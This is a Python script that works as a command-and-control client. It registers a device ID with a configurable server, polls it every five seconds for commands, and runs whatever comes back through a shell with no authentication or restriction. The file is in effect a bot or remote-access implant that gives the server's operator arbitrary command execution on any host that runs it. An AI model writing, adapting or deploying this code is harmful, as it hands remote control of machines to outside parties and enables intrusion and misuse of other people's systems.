import requests
import time
import uuid
import subprocess

SERVER_URL = 'http://127.0.0.1:1241'  # Replace with your server's IP address
DEVICE_ID = str(uuid.uuid4())


def register_device():
    try:
        response = requests.post(f'{SERVER_URL}/register', json={
            'device_id': DEVICE_ID,
            'timestamp': int(time.time())
        })
        response.raise_for_status() 
        return response.json()
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred: {err}")
    except requests.exceptions.RequestException as err:
        print(f"Request error occurred: {err}")
    return None


def check_in():
    try:
        response = requests.post(f'{SERVER_URL}/check_in', json={
            'device_id': DEVICE_ID,
            'timestamp': int(time.time())
        })
        response.raise_for_status()  
        return response.json()
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred: {err}")
    except requests.exceptions.RequestException as err:
        print(f"Request error occurred: {err}")
    return None


def get_command():
    try:
        response = requests.get(f'{SERVER_URL}/command/{DEVICE_ID}')
        response.raise_for_status()  
        return response.json()
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred: {err}")
    except requests.exceptions.RequestException as err:
        print(f"Request error occurred: {err}")
    except ValueError as err:
        print(f"Error parsing JSON response: {err}")
    return None


def execute_command(command):
    command_type = command.get('type')
    if command_type == 'execute_command':
        command_data = command.get('data')
        if 'command' in command_data:
            command_str = command_data['command']
            args = command_data.get('args', [])
            try:
                result = subprocess.check_output([command_str] + args, stderr=subprocess.STDOUT, shell=True)
                return result.decode('utf-8')
            except subprocess.CalledProcessError as e:
                return f"Error executing command: {e.output.decode('utf-8')}"
    elif command_type == 'no_command':
        return "No command assigned."
    else:
        return "Invalid command type."


if __name__ == '__main__':
    print('Registering device...')
    registration_response = register_device()
    if registration_response:
        print(registration_response)
    else:
        print("Failed to register device.")
        exit(1)

    while True:
        print("\nChecking in...")
        check_in_response = check_in()
        if check_in_response:
            print(check_in_response)
        else:
            print("Failed to check in.")
            time.sleep(5)
            continue

        command = get_command()
        if command:
            print(f"Received command: {command}")
            execution_result = execute_command(command)
            print(f"Command execution result:\n{execution_result}")
        else:
            print("Failed to retrieve command.")

        time.sleep(5) 
